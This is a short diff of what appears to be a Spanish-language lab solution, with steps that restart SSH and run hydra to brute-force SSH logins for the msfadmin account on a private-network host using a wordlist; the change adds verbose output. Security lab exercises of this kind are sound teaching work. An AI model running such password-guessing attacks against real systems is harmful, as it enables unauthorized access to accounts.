@@ -23,4 +23,4 @@ Solución:
 4.3 Aplicar cambios
 
 5. sudo systemctl restart ssh
-6. hydra 192.168.200.4 ssh -l msfadmin -P diccionario.txt
+6. hydra 192.168.200.4 ssh -l msfadmin -P diccionario.txt -vV
